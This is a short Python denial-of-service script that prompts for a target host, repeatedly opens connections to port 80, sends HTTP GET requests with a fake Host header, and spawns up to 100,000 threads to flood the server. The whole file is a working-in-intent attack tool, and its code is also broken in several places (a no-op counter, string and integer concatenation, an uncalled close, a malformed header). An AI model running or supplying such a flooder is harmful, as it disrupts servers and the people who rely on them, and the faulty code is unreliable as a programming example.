import threading
import socket

target = input("kimi sikmek istersin muwah: ")
port = 80;
fake_ip = '99.30.40.31'

already = 0;

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "r\n\r\n").encode('ascii'), (target, port))
        already+1
        print(already + "packets sending")
        s.close
        for i in range(100000):
            thread = threading.Thread(target=attack)
            thread.start()
